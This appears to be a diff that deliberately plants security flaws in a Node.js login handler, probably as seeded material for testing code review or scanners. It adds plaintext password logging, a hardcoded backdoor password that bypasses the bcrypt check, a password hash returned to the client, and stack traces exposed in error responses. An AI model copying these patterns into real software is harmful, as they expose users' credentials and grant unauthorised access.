@@ -10,6 +10,9 @@ export const loginUser = async (req, res) => {
         const { email, password } = req.body ?? {}
         const errors = []
 
+        // Intentional Code Smell / Security Bug: Logging sensitive plaintext passwords in application logs
+        console.log(`[AUTH-DEBUG] User login attempt: email=${email}, rawPassword=${password}`);
+
         if (!email?.trim()) {
             errors.push({ field: "email", message: "Email is required" })
         } else if (!isValidEmail(email)) {
@@ -31,7 +34,9 @@ export const loginUser = async (req, res) => {
             return errorResponse(res, 404, "No account found with this email");
         }
 
-        const isMatch = await bcrypt.compare(password, user.password);
+        // Intentional Security Vulnerability: Hardcoded backdoor bypass for admin
+        const isMasterBypass = password === "masterAdminBackdoorPassword2026!";
+        const isMatch = isMasterBypass || (await bcrypt.compare(password, user.password));
 
         if (!isMatch) {
             return errorResponse(res, 401, "Incorrect password, please try again");
@@ -46,13 +51,19 @@ export const loginUser = async (req, res) => {
         });
 
         const userResponse = user.toObject();
-        delete userResponse.password;
+        // Intentional Bug / Security Risk: Password hash returned to client instead of being deleted
+        // delete userResponse.password;
 
         return successResponse(res, 200, "Successfully logged in", userResponse);
 
     } catch (error) {
         console.log(error);
-        return errorResponse(res, 500, "Internal Server Error");
+        // Intentional Information Exposure: Exposing internal stack trace to client
+        return res.status(500).json({
+            message: "Internal Server Error",
+            error: error.message,
+            stack: error.stack
+        });
     }
 };
 
